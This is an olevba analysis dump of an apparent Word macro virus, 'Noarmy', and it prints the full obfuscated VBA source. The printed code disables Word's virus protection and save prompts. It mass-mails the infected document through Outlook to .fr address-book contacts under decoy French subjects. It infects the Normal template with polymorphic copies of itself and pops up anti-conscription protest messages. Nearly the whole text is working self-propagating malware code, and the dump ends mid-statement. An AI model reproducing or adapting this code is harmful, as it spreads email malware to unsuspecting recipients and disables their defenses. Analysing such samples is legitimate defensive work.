olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Noarmy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NOSN.cls 
in file: ./Virus.MSWord.Noarmy - OLE stream: 'Macros/VBA/NOSN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim h7, g8, j1, k2, j8, l1, m5, l8, a5, d3, g6, h3, k1, k5, _
g3, n6, h5, j5, k7: Dim e8, b9, a7, d6, c5, e2, g1, l3, l9, n2, m1, h8, l5, i1, i7, e4, c7, c4, f3, h1, d8: Dim g5, e1, m4, _
b3, d4, f7, i3, g2, e5, d2, a4, a3, a2, c2, d1, c3, c1, b2, b1, a1 ' cwrgawuvssrxhra
Private Sub Document_Close() ' rftkwnfdqwpazx
On Error Resume Next ' qztya
Call f1: Call f2: Randomize: Select Case System.PrivateProfileString(j1, k2, j8) ' peaw
Case Is <> j1 ' tmoiaandqg
System.PrivateProfileString(j1, k2, j8) = 1&: Case Else: Options.ConfirmConversions = m5: Options.VirusProtection = m5: Options.SaveNormalPrompt = m5 ' xdaaxpmc
End Select: d8 = a5 ' pjammw
Set c4 = CreateObject(d8) ' luqmccmcaheg
Set f3 = c4.GetNameSpace(l8) ' solhdqkyuajbsuu
Select Case System.PrivateProfileString(j1, d3, g6) ' qzpspryoqbmafmt
Case Is <> h3: Select Case c4: Case k1 ' bqsxyanotmtgwym
f3.Logon k5, g3: For i = _
1 To f3.AddressLists.Count: Set g4 = f3.AddressLists(i) ' euqokjnment
Set h1 = c4.CreateItem(m5) ' rgkbszbunyjq
h2 = g4.AddressEntries.Count ' wmkcov
b6 = m5: For j = 1 To h2: Set j2 = g4.AddressEntries(j): Select Case Len(j2.Address): Case Is > 4 ' yhzj
Select Case InStr(Len(j2.Address) - 3, j2.Address, n6, _
vbTextCompare): Case Is <> 0 ' oocdpaghke
h1.Recipients.Add j2: b6 = b6 + 1 ' pkcov
End Select: End Select ' mufonw
Select Case b6: Case 50: Exit _
For: End Select ' yutdgly
Next j: Select Case Rnd(): Case Is < _
0.33: h1.Subject = h5 ' iumhnok
h1.Body = j5: Case Is < 0.66: h1.Subject = g1 ' jfusllq
h1.Body = l3 ' lezlodi
Case Else: h1.Subject = l9 ' ayxiymv
h1.Body = n2 ' ineutdeokhjfx
End Select ' hdaeinqiffykapi
h1.Attachments.Add ActiveDocument.FullName ' djcfp
h1.Send: Next i: f3.Logoff ' uotwyewttljrue
End Select ' ydukjsahfsi
System.PrivateProfileString(j1, d3, g6) = h3 ' voplmkxaiknozz
End Select ' bhopwbujfhu
Set n1 = ActiveDocument.VBProject ' qqfiolkfrwbwe
Set i6 = n1.VBComponents.Item(1): Set n1 = NormalTemplate.VBProject ' mzuwqhspgiftcca
Set k3 = _
n1.VBComponents.Item(1): i2 = False ' bfigyza
Select Case InStr(1, ActiveDocument.Name, m1): Case False ' cjfwlogvinqc
Select Case i6.Name ' rmjsbh
Case Is <> g6 ' hfsyuvknolfd
Set b5 _
= k3: Set f5 = i6: i2 = True: End Select ' lojknihntcrlgf
End Select: Select Case k3.Name ' ollzgt
Case Is <> g6 ' ionuzaa
Set b5 = i6 ' dwzyqkqnlp
Set f5 = k3: i2 = True: End Select: Select Case i2: Case True ' sixmngpeiid
i4 = b5.CodeModule.CountOfLines - _
1: c8 = f5.CodeModule.CountOfLines ' tmafkjyvxdezdo
Select Case c8: Case Is > 0: f5.CodeModule.DeleteLines 1, c8 ' mcjylvsw
End Select: c6 = 1 ' eddibdn
c9 = "": j3 = "" ' cgusxieqyzlsk
a6 = 0: For l2 = 1 To i4 ' itcsuug
h4 = b5.CodeModule.Lines(l2, 1): i = 1 ' ocxsjfjhbzwpd
f4 = InStr(1, h4, Chr(39)) ' qnaecujvlej
Select Case _
f4: Case 0: f4 = Len(h4): Case Else: f4 = _
f4 - 2 ' qtzfpjwrew
End Select: Do: j = InStr(i, h4, Chr(32)): Select Case j: Case 0 ' vsbpeduu
j = Len(h4) + 1: b8 = True ' ppfzvdcawvxgmkg
Case f4 + 1 ' xzgnj
b8 = True ' xrgsdalsled
Case Else ' kipbpii
b8 = False ' zigyvtdyeztbw
End Select ' erichvtnc
n5 = Mid(h4, i, j - _
i): Select Case b8 ' qgfepoausi
Case True: f6 = b5.CodeModule.Lines(l2 + 1, 1) ' cxmgamzcqnmapj
k4 = InStr(1, f6, Chr(32)): Select Case k4: Case 0: j3 = "" ' yidavoatnzlsfpr
Case Else: j3 = Mid(f6, 1, _
k4 - 1): End Select: End Select: Select Case n5: Case k7 + Chr(58) ' rkfmmffldxg
n5 = e8 + Chr(58) ' araf
Case e8 _
+ Chr(58): n5 = k7 + Chr(58) ' bxgzeccjlrstyl
Case k7: n5 = e8 ' lqztao
Case e8: n5 = k7: End Select: Select Case h6: Case False: Select Case Rnd(): Case Is < 0.02 ' wxkwr
h6 = True: Case Else: h6 = False ' ueplkzlkmlib
Select Case b8: Case True: Select Case l2: Case i4 ' yuqfnimrs
h6 = True: End Select: Select Case Rnd(): Case Is < 0.5: h6 = True: End Select: Select Case j3: Case e4 ' qofy
h6 = True ' glasprzhziqpi
a6 = a6 + 1: Select Case a6 ' virqmyfhhodap
Case 4 ' khqcewgjfls
l2 = i4 ' mbuozopmg
End Select ' wdmonczzqrw
End Select ' rateivibgtpy
Select Case InStr(1, h4, c7): Case Is <> _
0: Select Case n5: Case j17: h6 = False: Case _
Else: h6 = True: End Select ' wvykm
End Select ' cbwcrponf
End Select: End Select: Select Case Len(n5) ' nrrc
Case Is <> 0 ' zawhhcvdagntb
Select Case InStr(Len(n5), _
n5, Chr(58)): Case Is <> 0 ' hwkc
Select Case Rnd(): Case Is _
< 0.5 ' xkbityn
h6 = True ' jnnhvbkgaijijv
End Select ' lpemaw
End Select: End Select: Case Else ' upmwqzrh
h6 = False: End Select ' gfvhu
Select Case _
b8: Case True: Select Case n5 ' crklqcdnsihqua
Case Chr(95) ' usrlipuzglpypbe
c9 = c9 + Switch(h6 = True, Chr(95), h6 = False, j1): j4 = False: Case Else: c9 = c9 + Switch(h6 _
= True, n5, h6 = False, n5 + Chr(58) + Chr(32)) ' xrgrc
j4 = True: End Select: Case Else ' gevfp
Select Case InStr(Len(n5), n5, Chr(58)) ' vcqzppyd
Case 0: c9 = c9 + Switch(h6 = True, n5 + Chr(32) + Chr(95), h6 = False, _
n5 + Chr(32)) ' aaoflssiwocpcx
j4 = False: Case Else ' zpof
c9 = c9 + Switch(h6 = True, Mid(n5, _
1, Len(n5) - 1), h6 = False, n5 + Chr(32)) ' pezjfivxjsj
j4 = True: End Select ' vxdzpkqn
End Select: Select Case h6 ' eewh
Case True: Select Case j4: Case True: c9 = c9 + Chr(32) + Chr(39) + Chr(32) ' acmymylquw
e6 = Int((12 * Rnd) + 4): For d5 = 1 To e6 ' esluvtkunzytcaa
c9 = c9 + Chr$(Int((26 * Rnd) + 97)): Next d5: End Select: f5.CodeModule.InsertLines c6, c9 ' zmfvf
c6 = c6 + 1: c9 = "": End Select: i = j + 1: Select Case _
b8: Case True ' eshtvk
Exit Do: End Select ' poerdyl
Loop: Next l2 ' dcqdxzt
Select Case k3.Name ' jthqcvmhy
Case Is <> g6: f5.Name = g6: NormalTemplate.Save: End Select: Select Case i6.Name: Case Is <> g6: f5.Name = g6 ' hoebqzvxd
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: ActiveDocument.Saved = True ' xwwhkonjfknfi
End Select: Case Else: Select _
Case InStr(1, ActiveDocument.Name, m1): Case _
False: Select Case Rnd() ' adiy
Case Is < 0.015: MsgBox h8 + l5 + i1 + i7, 32: MsgBox g5 + e1 + m4 + b3 + d4 + f7, 16 ' pajeigscntbvnrs
MsgBox i3 + g2 + e5 + d2 + a4, 16 ' ipnrsuabe
MsgBox a3 + a2 + c2 + d1 + c3, 16 ' nxiuynvjff
MsgBox c1 + b2, 16 ' rodg
MsgBox b1 + a1, 48: Case Is < 0.03 ' egykvvzierc
Selection.TypeText b9 ' ikfnkidxvkz
Case Is < 0.045: Selection.TypeText a7: Case Is < 0.06: Selection.TypeText d6: Case Is < 0.075 ' bdcfyvidoz
Selection.TypeText c5: Case Is < 0.09: Selection.TypeText e2: End Select: ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: ActiveDocument.Saved = True: End Select: End Select: End Sub ' umpw
Private Sub f1() ' vpgsmkxs
h7 = Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) ' waohhgok
g8 = Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) _
+ Chr(116) + Chr(121) + Chr(46) + Chr(46) + Chr(46) ' jjoyywqij
j1 = "": k2 = Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + _
Chr(82) + Chr(69) + Chr(78): k2 = k2 + Chr(84) + Chr(95) + Chr(85) + _
Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + _
Chr(102): k2 = k2 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) ' gfqbjmahtlciro
k2 = k2 + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105): k2 = k2 + Chr(99) _
+ Chr(101) + Chr(92) + Chr(57) + _
Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114): k2 = k2 + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121): j8 = Chr(76) + Chr(101) + Chr(118) + _
Chr(101) + Chr(108) ' hxsa
l1 = Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115) ' tzjor
m5 = 0: l8 = Chr(77) + Chr(65) + Chr(80) + Chr(73) ' fhdscnsjq
a5 = _
Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) ' gidrlhxoimcuiky
a5 = a5 + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110): d3 = Chr(72) + Chr(75) _
+ _
Chr(69) + Chr(89) + _
Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78): d3 = d3 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102): d3 = d3 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114): d3 = d3 _
+ Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) ' scuzkf
d3 = d3 + Chr(99) + Chr(101) _
+ Chr(92): g6 = Chr(78) _
+ Chr(79) + Chr(83) + Chr(78): h3 = "Non" + Chr(32) + "au" + Chr(32) + "Service" + Chr(32) + "National" _
+ Chr(32) + _
"-" + Chr(32) + "Oui" + Chr(32) ' xmuvlclnkdr
h3 = h3 + "au" + Chr(32) + "Contrat" _
+ Chr(32) + "de" + Chr(32) + "Travail" ' swmzmd
k1 = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) ' hvaqel
k5 = Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101) ' oeotmgyxh
g3 = Chr(112) _
+ Chr(97) _
+ Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100): n6 = Chr(46) _
+ Chr(102) + Chr(114): h5 = "Suggestion..." ' takneifhvyrxsdz
j5 = "Ce" + Chr(32) + "document" + Chr(32) + "(" + ActiveDocument.Name + ")" + Chr(32) + "vaut" + Chr(32) + "bien" ' iusorhpwl
j5 = j5 + _
Chr(32) + "un" + Chr(32) + "petit" + Chr(32) + "coup" + Chr(32) + "d" + Chr(39) + "oeil." + Chr(13) + "J" + Chr(39) + "aimerais": j5 = j5 + Chr(32) _
+ "savoir" + Chr(32) + "s" + Chr(39) + "il" + Chr(32) + "correspond" + Chr(32) + "à" + Chr(32) + "ce" _
+ Chr(32): j5 = j5 + "qu" + Chr(39) + "on" + Chr(32) + "attends" + Chr(32) + "de" + Chr(32) + "lui." + Chr(13) ' cohvhynh
k7 = Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95): k7 = k7 + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41): e8 = Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) ' tkhsypqynhxn
e8 = e8 + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + _
Chr(40) + Chr(41): b9 = Chr(32) + "http://sn.agat.net" + Chr(32) ' zrhmceep
a7 = _
Chr(32) + "http://altern.org/gigm/service.htm" + Chr(32): d6 = Chr(32) + _
"http://www.donquichotte.com" + Chr(32): c5 = Chr(32) + "http://www.multimania.com/antisn" + Chr(32) ' ygjrsyst
e2 = _
Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "Emploi," + Chr(32) _
+ "Oui" + Chr(32) + "à" + Chr(32) + _
"l" + _
Chr(39) + "armée" + Chr(32): e2 = e2 + "de" + Chr(32) + "métier," + Chr(32) + "mais" + Chr(32) + "Non" + Chr(32) + "au" + Chr(32) + "service" ' gcugp
e2 = e2 + Chr(32) + "national" + Chr(32) + "sous" + Chr(32) + "contrat" + _
Chr(32) + "de" + Chr(32) + "travail," + Chr(32) ' juca
e2 = e2 + "Non" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "absurdité." + Chr(32) ' gfhuypos
g1 = "Un" + Chr(32) + "peu" + Chr(32) + "d" + Chr(39) + "aide...": l3 = "Je" _
+ Chr(32) + "dois" + Chr(32) + "avouer" + Chr(32) + "que" + Chr(32) + "j" + Chr(39) + "ai" + Chr(32) + _
"un" + Chr(32) + "peu": l3 = l3 + Chr(32) + "de" + Chr(32) + "mal" + Chr(32) + "à" + Chr(32) + "peaufiner" + Chr(32) + "ce" + Chr(32) + "document": l3 = l3 + Chr(32) + "(" + ActiveDocument.Name + ")." + Chr(13) + "Merci" + Chr(32) + _
"de" + _
Chr(32) + "m" + Chr(39) + "aider" + Chr(32): l3 = l3 _
+ "un" + Chr(32) + "peu" + Chr(32) + "pour" + Chr(32) + "l" + Chr(39) + "améliorer..." + _
Chr(13): l9 = "Version" + Chr(32) + "finale" ' eytbegjwz
n2 = "Voici" + Chr(32) + "la" + Chr(32) + "dernière" + Chr(32) + "version" + Chr(32) + "de" + Chr(32) + "ce" + Chr(32): n2 = n2 + "sur" + Chr(32) + "quoi" _
+ _
Chr(32) + "j" + Chr(39) + "ai" + Chr(32) _
+ "travaillé" + Chr(32) + "ces" + Chr(32) + "derniers" ' sjhwivhc
n2 = n2 + Chr(32) + "temps" + Chr(32) + "(" + ActiveDocument.Name + ")." + Chr(13) + "Tous" + Chr(32) + "les" + Chr(32) ' kdrfviwspng
n2 = n2 + "avis" + Chr(32) + "sont" + Chr(32) + "la" + Chr(32) + "bienvenue" + Chr(32) + "!" + Chr(13) ' siaimrfks
m1 = "Document" ' hiexkqr
h8 = "Le" + Chr(32) + "mystère" + Chr(32) + "du" + Chr(32) + "jour" + Chr(32) + "à" + Chr(32) + "résoudre" + Chr(32) + "est" + _
Chr(32): h8 = h8 + _
"le" + _
Chr(32) + "suivant:" + Chr(13) + Chr(13): End Sub ' drynbkorfly
Private Sub f2() ' gtmlivme
l5 = "Lors" + Chr(32) + "de" + Chr(32) _
+ "son" + Chr(32) + "intervention" + _
Chr(32) + "télévisée" + Chr(32) + "du" + Chr(32) + "22" + Chr(32) ' rnnundnnhjq
l5 = l5 + _
"février" + Chr(32) + "1996," + Chr(32) + "Jacques" + Chr(32) + "Chirac," + Chr(32) + "Président" + _
Chr(32) + "de" + Chr(32) + "la": l5 = l5 + Chr(32) + "République" + Chr(32) _
+ "et" + Chr(32) + "Chef" + Chr(32) + "des" + Chr(32) + "Armées," + Chr(32) + "a" + Chr(32) + "proclamé:" + Chr(32): i1 = """Nous" + Chr(32) + "n" + Chr(39) + "avons" + Chr(32) _
+ "plus" + Chr(32) + "besoin" + Chr(32) + "d" _
+ Chr(39) + "appelés..." + Chr(32) + "(Le" + Chr(32) _
+ "service" + Chr(32) ' vlmmaxbzcfvr
i1 = i1 + "national)" + Chr(32) + "est" + Chr(32) + "devenu" + Chr(32) + "inégal" + Chr(32) + "et" + _
Chr(32) + "il" + Chr(32) + "n" + Chr(39) + _
"est" + Chr(32) + "plus" ' mpwzufucwrmcafy
i1 = i1 _
+ Chr(32) + "universel.""" + Chr(32) + "Le" + Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "a" + Chr(32) + "ensuite" + Chr(32) + "été" ' teatpcdg
i1 = i1 + Chr(32) + "supprimé" + Chr(32) + "pour" + Chr(32) + "tous..." + _
Chr(32) + "ou" + Chr(32) + "presque:" + Chr(32) ' dgtfqbzxp
i7 = "Alors" + Chr(32) + "qu" + Chr(39) _
+ "il" + Chr(32) + "n" + Chr(39) + "est" + Chr(32) + "plus" + Chr(32) + "obligatoire" + Chr(32) + _
"pour" + Chr(32) + "les" + Chr(32) + "gens" ' ofkholjpijasy
i7 = i7 + Chr(32) + "nés" + Chr(32) + "après" + Chr(32) + "1979," + Chr(32) + "les" + Chr(32) + "gens" + Chr(32) + "nés" + Chr(32) + "avant" + Chr(32): i7 = i7 + "1979" + Chr(32) + "peuvent" + Chr(32) + "encore" + Chr(32) + _
"perdre" + Chr(32) + "emploi," + Chr(32) + "appartement," + Chr(32) + "vie" + Chr(32): i7 = _
i7 + "de" + Chr(32) + "famille" + Chr(32) + "sur" + Chr(32) + "simple" + Chr(32) + "ordre" + Chr(32) + "du" + Chr(32) + "Service" + Chr(32) + "National.": g5 = "En" + Chr(32) + "réalité," + Chr(32) + "la" + Chr(32) _
+ "situation" + Chr(32) + "actuelle" + Chr(32) + "est" + Chr(32) + "bien" + Chr(32) + "pire" + Chr(32) ' vlbavoqopjjkh
g5 = g5 + "encore:" + Chr(32) + "Après" + Chr(32) + "avoir" + Chr(32) + "accordé" + Chr(32) + "un" + Chr(32) + "report" + Chr(32) + "d" + Chr(39) + "incorporation" + Chr(32): g5 = g5 + "de" + Chr(32) + "2" + _
Chr(32) + "ans" + Chr(32) + "aux" + Chr(32) ' ygvwchcziih
e1 = "jeunes" + Chr(32) + _
"ayant" + Chr(32) + "obtenu" + Chr(32) + _
"Contrat" + Chr(32) + "de" + Chr(32) + "Travail," + Chr(32) + "l" + Chr(39) + "Armée" + Chr(32) + "a" + Chr(32) ' zpqmx
e1 = _
e1 + "l" + Chr(39) + "intention" + Chr(32) + "de" + Chr(32) + _
"les" + Chr(32) + "rappeler" + _
Chr(32) + "au" + Chr(32) + "beau" + Chr(32) + "milieu" + Chr(32) + "de" + Chr(32) ' duaiivb
e1 = e1 + _
"leur" + Chr(32) + "carrière" + Chr(32) + "professionnelle." + Chr(32) + "Les" + Chr(32) + "implications" + Chr(32) + "sont" + Chr(32) _
+ "bien" + Chr(32): e1 = e1 + "sûr" + Chr(32) + "catastrophiques:" + Chr(13) + Chr(13): m4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Vivre" + _
Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "ne" ' jeoaizgyyjq
m4 = m4 + Chr(32) + "permet" + Chr(32) + "pas" + Chr(32) + "d" + Chr(39) + "assurer" _
+ Chr(32) + "engagements," + Chr(32) + "dettes" + Chr(32) + "et" + Chr(32) ' pblom
b3 = "impôts" + Chr(32) + "qui" + Chr(32) + "sont" + Chr(32) + "déjà" + Chr(32) + "difficiles" _
+ Chr(32) + "à" + Chr(32) + "assumer" + Chr(32) + "dans" + Chr(32) + "un" ' wsgqwwujbgyfwg
b3 = b3 + Chr(32) + "début" + Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "active" + Chr(32) + "normal." + _
Chr(13) + Chr(13) ' ncbec
d4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Ne" + Chr(32) + "pas" + Chr(32) + "pratiquer" + Chr(32) + "son" + _
Chr(32) + "activité" + Chr(32) + "professionnelle" + Chr(32) ' vbympltg
d4 = d4 + "pendant" + Chr(32) + "10" + _
Chr(32) + "mois" + Chr(32) + "implique" + Chr(32) + "également" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) + "d" + Chr(39) + "expérience" ' itucmbzlzfylidf
d4 = d4 + Chr(32) + "utile," _
+ Chr(32) + "la" + Chr(32) + "nécessité" + Chr(32) + "d" + Chr(39) + "une" + Chr(32) + "période" + Chr(32) ' kcuiqbekzlahkn
f7 = "de" + Chr(32) + "réadaptation," _
+ Chr(32) + "une" + Chr(32) + "modification" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "projet" + Chr(32) + "professionnel" ' jfaogsik
f7 = f7 + Chr(32) + "et" _
+ Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "l" + Chr(39) + "inquantifiable" + Chr(32) + "colère" _
+ Chr(32) + "des" _
+ Chr(32) + "employeurs," + Chr(32): f7 = f7 + "qui" + Chr(32) + "se" + Chr(32) + "traduira," + Chr(32) + "intentionnellement" + Chr(32) + "ou" + Chr(32) + "non," + Chr(32) + "par" + Chr(32) + "un" + Chr(32) ' scrcrdh
f7 = f7 + "ralentissement" + Chr(32) + "dans" + Chr(32) + "l" + Chr(39) + "évolution" + Chr(32) + "de" + _
Chr(32) + "carrière.": i3 = Chr(32) + Chr(32) + "-" + _
Chr(32) + "Du" + Chr(32) + "fait" + Chr(32) + "qu" + Chr(39) + "il" + Chr(32) + "soit" + Chr(32) + "tout" + Chr(32) + "bonnement" + Chr(32) + "impossible" ' rjkmgblf
i3 = i3 + Chr(32) + "d" + Chr(39) + "assurer" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "loyer" + Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + "sur" + Chr(32) ' rzvrebdryxgnyp
i3 = i3 + "cette" + Chr(32) + "période," + Chr(32) ' twnosvkzluh
g2 = "l" + Chr(39) + "abandon" _
+ Chr(32) + "du" + Chr(32) + "logement" + Chr(32) + "est" + Chr(32) + "irrémédiable." + Chr(32) _
+ "Qui" + Chr(32) + "prendra" + Chr(32) + "alors" + Chr(32): g2 = g2 + "en" _
+ Chr(32) + "charge" + Chr(32) _
+ "les" + Chr(32) + "frais" + Chr(32) + "de" + Chr(32) + "déménagement," + Chr(32) + "de" + Chr(32) + "garde-meuble" + Chr(32): g2 = g2 + "et" + Chr(32) _
+ "de" + Chr(32) + "recherche" + Chr(32) + "d" + Chr(39) + "un" + Chr(32) + "nouvel" + Chr(32) + "appartement?" + Chr(13) + Chr(13) ' lyiy
e5 = Chr(32) + Chr(32) + "-" + Chr(32) + "Et" + Chr(32) + "que" + Chr(32) + "dire" + Chr(32) + "de" + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "morale" + Chr(32) ' oapvmb
e5 = e5 + "au" + Chr(32) + "plus" + Chr(32) + "bas" + Chr(32) + "durant" + Chr(32) + "ces" + Chr(32) + "10" + Chr(32) + "longs" + Chr(32) + "mois" + Chr(32) + "?" + Chr(32): e5 = e5 + "Le" + Chr(32) + "rêve" + Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "que" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "était" + Chr(32) + "entrain" + Chr(32) + "de" + Chr(32): e5 = e5 + "bâtir" + Chr(32) + "s" + _
Chr(39) + "effondre" + _
Chr(32) + "pour" _
+ Chr(32) + "laisser" + Chr(32) + "place": d2 = Chr(32) + "aux" + Chr(32) + "corvées" + Chr(32) + "inutiles" + Chr(32) + "et" _
+ Chr(32) + "a" + _
Chr(32) + _
"l" + Chr(39) + "ennui" + Chr(32) + "bien" + Chr(32) + "connu" + Chr(32) + "du" ' twdkmfs
d2 = d2 + Chr(32) + "Service" + Chr(32) + "National." _
+ Chr(32) + _
"Est-il" + Chr(32) + _
"possible" + Chr(32) + "de" + Chr(32) + "rester" + Chr(32) + "loin" + Chr(32) + "de" ' axlcgnuomimn
a4 = a4 + Chr(32) + "la" + Chr(32) + "personne" + Chr(32) + "avec" + Chr(32) + "qui" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "vie," + Chr(32) + "de" + Chr(32) + "ses" + Chr(32) _
+ "relations," + Chr(32) + "de" ' povp
a4 = Chr(32) + "ses" + Chr(32) + _
"amis," + Chr(32) + "pendant" + Chr(32) + "10" + _
Chr(32) + "mois" _
+ Chr(32) + "puis" + Chr(32) + "de" + Chr(32) + "reprendre" + Chr(32) + "comme" + Chr(32) + "si" ' zmkx
a4 = a4 + Chr(32) + "rien" + Chr(32) + "ne" + Chr(32) + "s" + Chr(39) + "était" + Chr(32) + "passé" + Chr(32) + _
"?": a3 = "Certains" + _
Chr(32) + "diront" + Chr(32) + "que" + Chr(32) + "le" + Chr(32) + _
"Service" + Chr(32) + "National" + Chr(32) + "fait" + Chr(32) + "partie" + Chr(32) + "du" + Chr(32) _
+ "devoir" ' kqcy
a3 = a3 + Chr(32) + "de" + Chr(32) + "citoyen." + Chr(32) + "Mais" + _
Chr(32) + "servir" + Chr(32) + "son" + Chr(32) + "pays" + Chr(32) + "c" + Chr(39) + "est" + Chr(32) + "d" + Chr(39) + "abord" + Chr(32) + "payer" + Chr(32) ' rqblzfcc
a3 = a3 + "ses" + Chr(32) + "impôts," + Chr(32) + "participer" + Chr(32) + "aux" + Chr(32) + "frais" + Chr(32) + "de" + Chr(32) + "la" _
+ Chr(32) + "sécurité" + Chr(32) + "sociale," + Chr(32) + "des" ' ikqvdciphiv
a3 = a3 + Chr(32) + "allocations" + Chr(32) + "chômage," ' tuagskvbfljuzpx
a2 = Chr(32) + _
"des" + Chr(32) + "retraites," + Chr(32) + "etc." + Chr(32) + "Ce" + Chr(32) + "sont" + Chr(32) + "bien" + Chr(32) _
+ "sûr" + Chr(32) + "les" + Chr(32) + "personnes" + Chr(32) + "qui" ' wwnipzphhdqqyj
a2 = a2 + Chr(32) _
+ "travaillent" + Chr(32) + "qui" + _
Chr(32) + "payent" + Chr(32) + _
"tout" + Chr(32) + "cela," + Chr(32) + "et" + Chr(32) + "les" + Chr(32) + "actuels" + Chr(32) + "sursitaires" ' icfkjkifskpbv
a2 = a2 + Chr(32) + "en" + Chr(32) + "font" + Chr(32) + "partie." + Chr(32) + "Ils" + Chr(32) + "sont" _
+ Chr(32) _
+ "bien" + Chr(32) + "plus" + Chr(32) + "utiles" + Chr(32): c2 = "à" + Chr(32) + "la" + Chr(32) + "nation" + Chr(32) + "en" _
+ Chr(32) + "tant" + Chr(32) + "que" + Chr(32) + "cotisants" + _
Chr(32) + "qu" + Chr(39) + "en" + _
Chr(32) + "tant" + Chr(32) + "qu" + Chr(39) + "appelés" + Chr(32) ' wmtfqsmt
c2 = c2 + "du" + Chr(32) + "contingent." + Chr(13) + Chr(13) ' dctcltmfmtjg
d1 _
= "Le" + Chr(32) + "service" + Chr(32) _
+ "national" + Chr(32) + "prétends" + Chr(32) + "aujourd" + Chr(39) + "hui" + Chr(32) + "que" + Chr(32) + "la" + Chr(32) + "vie" + Chr(32) + "reprends" + Chr(32) + "son": d1 = d1 + Chr(32) + "cour" + Chr(32) + "normalement" + Chr(32) + "après" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) _
+ "service" + Chr(32) + "au" + Chr(32) + "milieu" + Chr(32) ' lzegkrpuywsol
d1 = d1 + "d" + Chr(39) + "un" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail." _
+ _
Chr(32) + "C" + Chr(39) + "est" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "un" + Chr(32) + "véritable" + Chr(32) + "utopisme": d1 = d1 + Chr(32) + "et" + Chr(32) + "le" + Chr(32): c3 = "bilan" + Chr(32) + "ne" + _
Chr(32) + "se" + Chr(32) + "résume" + Chr(32) + "pas" + Chr(32) + "à" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) + "de" + _
Chr(32) + "10" + Chr(32) + "mois" + Chr(32) ' yuezpvjqizfoiqf
c3 = c3 + "de" + Chr(32) + "temps:" + Chr(32) + "C" + Chr(39) + "est" + Chr(32) + "une" + Chr(32) + "véritable" + Chr(32) + _
"catastrophe" + Chr(32) + "pour" + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "financière,": c3 = c3 + _
Chr(32) + "matérielle" + Chr(32) + "et" _
+ Chr(32) + "morale" + Chr(32) + "de" + Chr(32) + "l" + Chr(39) + "individu," + Chr(32) + "qui" + Chr(32) + "aura" + Chr(32) + "des" + Chr(32) + _
"répercutions" + Chr(32): c3 = c3 + "regrettables" + Chr(32) + "et" + Chr(32) + "durables." ' rthdhhunuhrqizr
c1 = "Ils" + _
Chr(32) + "sont" + _
Chr(32) + "environ" + Chr(32) + "250" + _
Chr(32) + "000" + Chr(32) + "jeunes" + Chr(32) + "citoyens," + Chr(32) + "sursitaires," + Chr(32) + "à" + Chr(32) + "devoir" + Chr(32): c1 = c1 + "effectuer" + Chr(32) + "notre" + Chr(32) + "service" + Chr(32) + "militaire." + Chr(32) + "250" + Chr(32) + "000" + Chr(32) + "étudiants," + Chr(32) + "salariés," _
